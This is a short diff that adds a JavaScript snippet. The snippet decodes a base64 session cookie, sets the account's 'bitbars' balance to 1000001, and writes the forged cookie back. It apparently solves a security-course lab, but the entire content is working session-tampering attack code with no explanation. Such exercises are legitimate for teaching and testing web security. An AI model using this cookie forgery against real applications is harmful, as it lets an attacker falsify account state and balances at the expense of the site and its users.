@@ -1,0 +1,11 @@
+var cookie = atob(document.cookie.substring(8));
+var session = JSON.parse(cookie);
+session.account.bitbars = "1000001";
+var new_cookie = JSON.stringify(session);
+document.cookie = "session=".concat(btoa(new_cookie));
+
+
+
+
+
+
